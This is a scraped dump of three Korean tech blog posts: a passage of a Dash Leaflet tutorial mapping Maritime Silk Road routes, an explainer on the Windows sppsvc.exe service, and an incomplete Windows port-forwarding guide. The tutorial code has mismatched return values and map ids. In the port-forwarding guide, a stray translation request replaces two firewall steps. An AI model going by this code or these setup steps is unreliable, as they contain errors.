노선 포트의 해상 경로 지도 마커 및 경로 계산 함수 정의\ndef get_route_line(route_var):\n\n    route_rows = []\n    for port in route_var: # 노선 내 포트를 반복\n        port_name = port\n        lat = ports.loc[ports['Port'] == port, 'Latitude'].iloc[0]\n        lon = ports.loc[ports['Port'] == port, 'Longitude'].iloc[0]\n        row = {'Port': port_name, 'lat': lat, 'lon': lon}\n        route_rows.append(row)\n\n    route_df = pd.concat([pd.DataFrame(row, index=[0]) for row in route_rows], ignore_index=True)\n\n    # 계산된 포트 마커에서 맵 개체 생성\n    markers = []\n    for i in range(len(route_df)):\n        # 각 포트 마커에 대한 툴팁 생성\n        tooltip = route_df.loc[i, 'Port'] + ', ' + ports.loc[ports['Port'] == route_df.loc[i, 'Port'], 'Description'].iloc[0]\n        markers.append(  # 마커 계산\n            dl.Marker(\n                position=(route_df.loc[i, 'lat'], route_df.loc[i, 'lon']),\n                children=[dl.Tooltip(tooltip)]\n            )\n        )\n    cluster = dl.LayerGroup(children=markers)\n\n    # 해상 경로 계산\n    markers_line = []\n    length = 0\n    duration_hours = 0\n    for i in range(0, len(route_df) - 1):\n        origin = [route_df.loc[i, 'lon'], route_df.loc[i, 'lat']]\n        destination = [route_df.loc[i+1, 'lon'], route_df.loc[i+1, 'lat']]\n        searoutes_coords = sr.searoute(origin, destination, append_orig_dest=True, speed_knot=2)\n        searoutes_coords_transposed = [[coord[1], coord[0]] for coord in searoutes_coords['geometry']['coordinates']]\n        markers_line += searoutes_coords_transposed\n\n        length += searoutes_coords['properties']['length']\n        duration_hours += searoutes_coords['properties']['duration_hours']\n    duration_days = duration_hours / 24\n\n    # 계산된 해상 경로를 위한 맵 개체 생성\n    line = dl.Polyline(\n        positions=markers_line,\n        smoothFactor=1.0,\n        color='ForestGreen',\n        weight=1,\n        lineCap='round',\n        lineJoin='round'\n    )\n    patterns = [dict(offset='5%', repeat='30px', endOffset='10%', arrowHead=dict(pixelSize=8, polygon=False, pathOptions=dict(stroke=True, color='ForestGreen', weight=1, opacity=10, smoothFactor=1)))]\n    dline = dl.PolylineDecorator(children=line, patterns=patterns)\n\n    # 경계 계산\n    min_lat = min(lat for lat, lon in markers_line) - 2\n    max_lat = max(lat for lat, lon in markers_line) + 2\n    min_lon = min(lon for lat, lon in markers_line) - 2\n    max_lon = max(lon for lat, lon in markers_line) + 2\n    bounds = [[min_lat, min_lon], [max_lat, max_lon]]\n\n    # 중심 계산\n    x, y = zip(*markers_line)\n    centroid = [sum(x) / len(x), sum(y) / len(y)]\n\n    return cluster, dline, centroid, bounds, duration_days\n```\n\n따라서, 모든 계산은 두 개의 함수로 처리됩니다:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 레이아웃 생성\n\nget_route_line() 함수를 정의한 후, 이제 앱의 레이아웃 컴포넌트를 구성할 차례입니다. 아래 이미지와 유사한 레이아웃을 만들려고 합니다:\n\n![이미지](/assets/img/2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries_3.png)\n\n구체적으로는 다음 사항을 통합하고 싶습니다:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- 루트 선택 컨테이너는 루트를 선택할 수있는 드롭다운 메뉴와 선택한 루트, 가정된 선박 속도, 그리고 예상 항해 기간과 같은 각 루트에 대한 정보를 표시합니다.\n- 선택한 루트의 항구 및 해당 해상 경로를 표시하는 지도 시각화가 있습니다.\n\n드롭다운 패널은 다음과 같이 정의할 수 있습니다:\n\n```js\n# 드롭다운 및 루트 정보를 위한 왼쪽 패널\n    html.Div([\n        html.H1('고대 해상 실크로드'),\n        html.Div([\n            dcc.Dropdown(\n                id='route_dropdown',\n                options=[{'label': route, 'value': route} for route in routes['Route']],\n                placeholder='루트 선택'\n            )\n        ], style={'display': 'block', 'height': '30%', 'justify-content': 'center', 'color': 'gray'}),\n        html.Div(id='route_info', style={'height': '100%'})\n    ], style={'display': 'inline-block', 'height': '100%', 'width': '15%', 'background-color': '#17408B', 'color': 'white', 'padding': '2%', 'position': 'relative'}),\n```\n\n더 구체적으로, 드롭다운 메뉴는 이전에 정의한 routes DataFrame에 의해 채워집니다. 또한, 루트 정보 패널은 초기에 비어 있고 드롭다운 메뉴에서 루트를 선택하면 콜백을 통해 채워질 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n지도 시각화에 관한 내용은 다음과 같이 정의할 수 있습니다:\n\n```js\n# 지도 우측 패널\n    html.Div([\n        dl.Map(children=dl.LayersControl(\n            [\n                dl.BaseLayer(dl.TileLayer(url='https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png'), id='map_base', checked=True, name='기본 맵')\n            ] +\n            [\n                dl.Overlay(children=[], id='route_lines', checked=True, name='경로 방향'),\n                dl.Overlay(children=[], id='route_markers', checked=True, name='항구')\n            ]\n        ), id='routess_map', zoom=3)\n    ], style={'display': 'inline-block', 'height': '100%', 'width': '85%', 'background-color': 'white', 'box-sizing': 'border-box'})\n]\n```\n\ndl.Map() 구성 요소가 dl.BaseLayer() 구성 요소를 통해 선택한 기본 지도를 포함하고 있음에 주목하세요. 또한 dl.Overlay()로 정의된 다른 지도 객체도 포함됩니다. 여기서도 dl.Overlay()는 초기에 비어 있으며, 이전에 정의한 get_route_line() 함수를 사용하여 드롭다운 메뉴에서 경로를 선택하면 내용이 채워집니다.\n\n마지막으로 드롭다운 메뉴와 지도 컨테이너를 모두 부모 컨테이너에 포함시켜 앱의 레이아웃 구성 요소로 할당할 수 있습니다:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n# Dash 앱 초기화\napp = Dash(__name__)\n\n# 레이아웃 정의\napp.layout = html.Div([\n    # 드롭다운 및 경로 정보용 왼쪽 패널\n    html.Div([\n        html.H1('고대 해상 실크로드'),\n        html.Div([\n            dcc.Dropdown(\n                id='route_dropdown',\n                options=[{'label': route, 'value': route} for route in routes['Route']],\n                placeholder='경로를 선택하세요'\n            )\n        ], style={'display': 'block', 'height': '30%', 'justify-content': 'center', 'color': 'gray'}),\n        html.Div(id='route_info', style={'height': '100%'})\n    ], style={'display': 'inline-block', 'height': '100%', 'width': '15%', 'background-color': '#17408B', 'color': 'white', 'padding': '2%', 'position': 'relative'}),\n\n    # 지도용 오른쪽 패널\n    html.Div([\n        dl.Map(children=dl.LayersControl(\n            [\n                dl.BaseLayer(dl.TileLayer(url='https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png'), id='map_base', checked=True, name='기본 지도')\n            ] +\n            [\n                dl.Overlay(children=[], id='route_lines', checked=True, name='경로 방향'),\n                dl.Overlay(children=[], id='route_markers', checked=True, name='항구')\n            ]\n        ), id='events_map', zoom=3)\n    ], style={'display': 'inline-block', 'height': '100%', 'width': '85%', 'background-color': 'white', 'box-sizing': 'border-box'})\n], style={'display': 'flex', 'height': '100vh', 'width': '100vw', 'position': 'fixed', 'margin': '-8px', 'justify-content': 'center', 'boxSizing': 'border-box'})\n```\n\n## 콜백 설정\n\nDash 앱의 레이아웃을 설정했으니, 다음 단계는 앱의 상호작용성을 정의하는 것입니다. 드롭다운 메뉴에서 경로를 선택하면 지도에 해당 마커 및 라인이 나타나며, 해당 경로 정보도 표시됩니다. 다음과 같이 하나의 콜백 함수로 이를 구현할 수 있습니다:\n\n```js\n@app.callback(\n    Output('route_markers', 'children'),\n    Output('route_lines', 'children'),\n    Output('routes_map', 'center'),\n    Output('routes_map', 'bounds'),\n    Output('route_info', 'children'),\n    Input('route_dropdown', 'value')\n)\ndef update_map_lines(selected_route):\n    if selected_route is None:\n        bounds = [[-50, -80], [50, 80]]\n        centroid = [0, 0]\n        return [], [], centroid, bounds, []\n    else:\n        route_var = routes.loc[routes['Route'] == selected_route, 'Port_Sequence'].iloc[0]\n        cluster, dline, centroid, bounds, duration_days, length = get_route_line(route_var)\n\n        route_name = selected_route.replace('_', ' ').title()\n        route_info = [\n            html.P([html.B(\"경로: \"), route_name]),\n            html.P([html.B(\"거리: \"), f\"{length:.0f} km\"]),\n            html.P([html.B(\"속도: \"), \"2 knots\"]),\n            html.P([html.B(\"소요 시간: \"), f\"{duration_days:.0f} days\"]),\n        ]\n\n        return cluster, [dline], centroid, bounds, route_info\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 콜백은 이전에 만들었던 get_route_line() 함수를 사용하여 마커와 라인 지도 객체를 생성하고, 맵의 중심과 경계를 다시 계산하며 표시할 경로 정보를 계산합니다.\n\n## 앱 테스트\n\n레이아웃과 콜백 구성 요소를 정의한 후에, 우리의 앱은 준비가 되어 있고 다음 코드를 작성하여 실행할 수 있습니다:\n\n```js\nif __name__ == '__main__':\n    app.run_server(debug=True)\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그러면 전체 앱 파일을 실행할 수 있습니다. 모든 것이 올바르게 완료되었다면 이와 유사한 결과가 나올 것입니다:\n\n![image](/assets/img/2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries_4.png)\n\n✨그리고 와라✨\n\nDash 앱은 로컬호스트 서버에서 실행되며 표시된 URL을 통해 웹 브라우저에서 액세스할 수 있습니다. 이렇게 하면 앱의 완전히 작동하는 인스턴스를 볼 수 있고 디버깅할 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 내 생각 속으로\n\n데이터 분석과 시각화에서 Dash와 같은 사용자 정의 보고 도구가 유연성과 사용 편의성으로 인해 인기를 얻고 있습니다. Power BI나 Tableau와 같은 셀프 서비스 도구와 달리 미리 구축된 시각화 옵션을 많이 제공하는 Dash는 보고서 디자인과 기능에 대해 완전한 제어를 제공합니다. 이를 통해 특정 사용자 요구 사항을 충족하기 위해 완전히 사용자 정의된 보고서와 시각화를 작성할 수 있습니다.\n\n예를 들어, 이 게시물에서 보이는 지도 시각화는 사용자 지정 데이터 시각화 도구를 사용하지 않으면 상당히 어렵거나 불가능할 수 있습니다. 우리는 Tableau와 같은 도구를 사용한다면 루트 좌표를 따로 계산하고 저장한 다음 지도 위에 시각화해야 합니다. 심지어 방향성 있는 선을 생성하는 것조차 꽤 번거로울 것입니다. 이러한 수준의 사용자 정의는 데이터 전문가들에게 Dash가 점점 선호되는 이유를 강조합니다.\n\n✨읽어 주셔서 감사합니다!✨\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 게시물을 즐겼나요? 함께 친구가 되어요!\n\n💌 저와 함께 Medium이나 LinkedIn에서 만나요!\n\n💼 Upwork에서 저와 함께 일해보세요!\n","ogImage":{"url":"/assets/img/2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries_0.png"},"coverImage":"/assets/img/2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries_0.png","tag":["Tech"],"readingTime":24},{"title":"윈도우 프로세스 여행 - sppsvcexe 마이크로소프트 소프트웨어 보호 플랫폼 서비스","description":"","date":"2024-05-23 15:28","slug":"2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService","content":"\n\"sppsvc.exe\" (Microsoft Software Protection Platform Service)은 \"%windir%\\System32\\sppsvc.exe\"에 위치한 PE 이진 파일입니다. Windows의 64비트 버전에서는 \"cmd.exe\"와 같은 다른 이진 파일과 달리 실행 파일의 32비트 버전이 없습니다 (https://medium.com/@boutnaru/the-windows-process-journey-cmd-exe-windows-command-processor-501be17ba81b). 또한, \"sppsvc.exe\" 이진 파일은 Microsoft에 의해 디지털 서명되었습니다.\n\n전반적으로 \"sppsvc.exe\"는 \"Software Protection\" 서비스 (aka sppsvc)의 주요 이미지입니다. 서비스 설명에는 다음과 같이 명시되어 있습니다: \"Windows 및 Windows 애플리케이션의 디지털 라이선스 다운로드, 설치 및 강제 적용을 가능하게 합니다. 서비스가 비활성화되면 운영 체제 및 라이센스가 부여된 애플리케이션이 알림 모드에서 실행될 수 있습니다. 소프트웨어 보호 서비스를 비활성화하지 않는 것이 강력히 권장되며”. 이 서비스는 \"Network Service\" (https://medium.com/@boutnaru/the-windows-security-jorueny-network-service-nt-authority-network-service-e8706688e383) 사용자의 권한/권한으로 실행됩니다 — 아래 스크린 샷에서 확인할 수 있습니다.\n\n따라서, \"sppsvc.exe\"가 다음과 같은 기능을 수행한다고 말할 수 있습니다. Windows 운영 체제가 정품이고 제대로 활성화되었는지를 보장합니다. 주기적으로 Windows 라이선스가 여전히 유효한지 (그리고 취소되지 않았는지) 확인합니다. 또한, 새 Windows 사본을 설치하거나 컴퓨터에 중요한 하드웨어 변경을 수행할 때 활성화 프로세스를 처리합니다. 또한, 시스템의 활성 상태에 대한 익명 데이터를 Microsoft에 수집하고 전송할 수도 있다는 것을 알아야 합니다 (https://malwaretips.com/blogs/microsoft-software-protection-platform-service/).\n\n마지막으로, 활성화 토큰을 보관하는 \"“%windir%\\System32\\spp\\” 디렉토리가 있습니다 (https://community.spiceworks.com/t/windows-10-repeatedly-deactivates/681310). 이 디렉토리에서 파일을 백업하여 Office와 같은 다른 소프트웨어 제공을 다시 활성화할 수 있습니다 (https://community.citrix.com/forums/topic/230472-layered-image-office-2016-will-not-activate-on-first-boot/).\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다음 글에서 뵙겠습니다 ;-) 트위터에서 저를 팔로우할 수 있어요 — @boutnaru (https://twitter.com/boutnaru). 또한, 저의 다른 글들은 미디엄에서 읽을 수 있어요 — https://medium.com/@boutnaru. 무료 eBook은 https://TheLearningJourneyEbooks.com에서 찾을 수 있어요.\n\n![image](/assets/img/2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService_0.png)\n","ogImage":{"url":"/assets/img/2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService_0.png"},"coverImage":"/assets/img/2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService_0.png","tag":["Tech"],"readingTime":3},{"title":"윈도우에서의 포트 포워딩 및 설정 방법들","description":"","date":"2024-05-23 15:26","slug":"2024-05-23-PortForwardinginWindowsandWaystoSetitUp","content":"\nWindows에서 원격 액세스 또는 서버 호스팅을 위해 포트 포워딩 설정하는 방법을 배워보세요. 지금 당신의 장치에서 이를 활성화하고 구성하는 방법에 대한 가이드를 따르세요.\n\n![포트 포워딩 이미지](/assets/img/2024-05-23-PortForwardinginWindowsandWaystoSetitUp_0.png)\n\n본문에서 읽을 내용 목록:\n\n1. Windows에서의 포트 포워딩이란?\n2. 포트 포워딩이 작동하는 방식은?\n3. 포트 포워딩에 대한 명령 프롬프트 사용\n4. Windows 방화벽을 위한 포트 포워딩 구성\n5. Hyper-V 가상 스위치에서 NAT 규칙을 사용한 포트 포워딩\n6. Windows에서 Netsh 포트 포워딩 규칙 관리\n7. 결론\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n포트 포워딩은 네트워크의 보안 및 기능성을 제고하는 데 사용되는 기본적인 기술 중 하나입니다. 이는 네트워크 라우터를 구성하여 특정 포트로부터 오는 들어오는 트래픽을 네트워크 내의 지정된 장치로 전달하는 과정을 말합니다. Windows 환경에서 포트 포워딩을 설정하는 것은 기술적 지식이 제한된 사람들에게는 도전적일 수 있습니다. 하지만 올바른 지식과 도구를 활용하면 누구나 빠르게 포트 포워딩을 설정할 수 있습니다. 이 가이드에서는 Windows에서 포트 포워딩을 설정하는 단계와 그에 필요한 도구 및 기술에 대해 살펴보겠습니다.\n\n# Windows에서 포트 포워딩이란?\n\n포트 포워딩은 컴퓨터 및 기타 네트워크 장치가 인터넷과 통신할 수 있게 해주는 필수적인 네트워킹 기술입니다. 이는 로컬 네트워크 외부에서 인터넷에 접근해야 하는 장치, 서비스 또는 프로그램에 필요한 과정입니다. 포트 포워딩은 네트워크 외부의 특정 포트에서 네트워크 내의 특정 포트로 네트워크 트래픽을 라우팅함으로써 작동합니다. 기본적으로, 네트워크 라우터는 인터넷으로부터 들어오는 트래픽을 차단하도록 설계되어 있어 서버, 게임 콘솔 및 기타 네트워크 장치에서 문제가 발생할 수 있습니다.\n\n사용자가 네트워크의 장치에 연결을 시작하면 라우터가 요청을 받아 해당 장치로 전달합니다. 그러나 포트 포워딩이 없으면 라우터는 어떤 장치가 트래픽을 받아야 하는지 알 수 없어 연결이 실패합니다. 따라서 포트 포워딩은 특정 서비스, 장치 및 애플리케이션이 올바르게 작동하고 로컬 네트워크 외부의 인터넷에 접근할 수 있도록 하는 데 중요합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 포트 포워딩은 어떻게 작동하나요?\n\n포트 포워딩은 네트워크 외부의 특정 포트로부터 들어오는 트래픽을 네트워크 내의 특정 장치나 서비스로 리디렉션하는 방식으로 작동합니다. 이 과정은 라우터를 구성하여 네트워크 내의 특정 장치나 서비스로 특정 포트를 포워딩하는 것을 포함합니다. 외부 네트워크에서 연결 요청이 발생하면, 라우터가 해당 요청을 수신하고 요청에서 사용된 특정 포트 번호를 확인합니다. 그런 다음, 라우터는 포트 포워딩 규칙을 확인하여 요청을 수신할 장치나 서비스를 결정합니다. 규칙이 발견되면, 라우터는 포트 포워딩 구성에 따라 들어오는 트래픽을 지정된 장치나 서비스로 전달합니다.\n\n포트 포워딩은 복잡할 수 있지만, 적절한 지식과 도구를 활용하면 빠르고 쉽게 수행할 수 있습니다. 라우터에서 포트 포워딩을 구성하려면 라우터의 구성 인터페이스에 대한 지식, 각 서비스에 필요한 특정 포트 번호, 그리고 인터넷을 통해 접근해야 하는 네트워크 내 장치의 IP 주소에 대한 지식이 필요합니다.\n\n# 명령 프롬프트를 사용한 포트 포워딩\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n윈도우에서 포트 포워딩을 위해 명령 프롬프트를 사용하는 방법에 대한 단계별 안내서입니다:\n\n## 단계 1: 명령 프롬프트 열기\n\n시작 메뉴를 클릭하고 검색 필드에 “cmd”를 입력한 후 Enter 키를 눌러주세요. 그러면 명령 프롬프트 창이 열립니다.\n\n## 단계 2: 장치의 IP 주소 얻기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n명령 프롬프트 창에 \"ipconfig\"을 입력하고 Enter 키를 누르세요. 네트워크 어댑터 아래의 \"IPv4 주소\"를 찾아 IP 주소를 메모해 두세요.\n\n## 단계 3: 포트 포워딩 규칙 생성\n\n다음 명령을 입력하고 Enter 키를 누르세요:\n\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=192.168.1.10 connectport=8080 connectaddress=192.168.1.10\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 4: 포트 포워딩 규칙 확인하기\n\n다음 명령을 입력하고 Enter 키를 눌러주세요:\n\nnetsh interface portproxy show all\n\n이 명령은 현재 네트워크에서 활성화된 모든 포트 포워딩 규칙의 목록을 표시합니다. 만들었던 규칙이 나열되어 있는지 확인해보세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 5: 명령 프롬프트 닫기\n\n\"exit\"을 입력하고 Enter 키를 눌러 명령 프롬프트 창을 닫습니다.\n\n그것이죠! 이제 Windows에서 포트 포워딩을 위해 명령 프롬프트를 성공적으로 사용했습니다.\n\n# 포트 포워딩을 위한 Windows 방화벽 구성\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다음은 포트 포워딩을 위한 Windows 방화벽 구성 방법에 대한 단계별 가이드입니다:\n\n## 단계 1: Windows 방화벽 설정 열기\n\n시작 메뉴를 클릭하고 검색란에 \"방화벽\"을 입력한 후 \"Windows Defender 방화벽\"을 선택합니다.\n\n## 단계 2: \"고급 설정\"을 클릭하세요\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n치트 시트 태그를 마크다운 형식으로 수정해주세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\"Port\"을 선택하고 \"다음\"을 클릭하세요.\n\n## 단계 5: 포트 구성\n\n구성해야 할 포트 유형을 선택하세요: TCP 또는 UDP. \"구체적 로컬 포트\" 필드에 전달할 포트 번호를 입력하세요.\n\n## 단계 6: 작업 선택\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n“연결 허용”을 선택하고 “다음”을 클릭하세요.\n\n## 단계 7: 프로필 선택\n\n규칙을 적용할 프로필을 선택하고(Domain, Private, Public) “다음”을 클릭하세요.\n\n## 단계 8: 규칙의 이름 지정 및 저장\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n**단계 9: 규칙 확인**\n\n규칙에 이름을 지정하고 \"완료\"를 클릭하세요.\n\n# Hyper-V 가상 스위치에서 포트 포워딩을 위한 NAT 규칙 사용하기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n안녕하세요! Hyper-V Virtual Switch에서 NAT 규칙으로 포트 포워딩하는 방법에 대한 단계별 안내서입니다:\n\n## 단계 1: Hyper-V 매니저 열기\n\n시작 메뉴를 클릭하고 검색 필드에 \"Hyper-V 매니저\"를 입력한 후 결과에서 \"Hyper-V 매니저\"를 선택합니다.\n\n## 단계 2: 가상 스위치 생성\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n하이퍼-V 관리자 창의 오른쪽 사이드바에서 \"가상 스위치 관리자\"를 클릭하세요. \"새 가상 네트워크 스위치\"를 클릭하고 가상 스위치 유형으로 \"내부\" 또는 \"개인\"을 선택하세요.\n\n## 단계 3: 가상 스위치 구성\n\n가상 스위치에 이름을 지어 네트워크 어댑터 설정을 구성하세요. \"관리 운영 체제가이 네트워크 어댑터를 공유하도록 허용\" 옵션이 선택 해제되어 있는지 확인하세요.\n\n## 단계 4: 새 가상 머신을 만들거나 기존 머신을 선택하세요\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n하이퍼-V 관리자 창에서 가상 머신을 마우스 오른쪽 단추로 클릭하고 \"설정\"을 선택하세요.\n\n## 단계 5: 네트워크 어댑터 추가\n\n\"Add Hardware\"를 클릭하고 \"네트워크 어댑터\"를 선택하여 가상 머신에 네트워크 어댑터를 추가하세요.\n\n## 단계 6: 가상 스위치에 연결\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n### 단계 7: NAT 서브 스위치 활성화\n\nHyper-V 관리자 창에서 단계 2에서 생성한 가상 스위치를 마우스 오른쪽 버튼으로 클릭하고 \"속성\"을 선택합니다. \"NAT 활성화\" 옵션을 선택하고 \"OK\"를 클릭합니다.\n\n### 단계 8: NAT 규칙 생성\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || 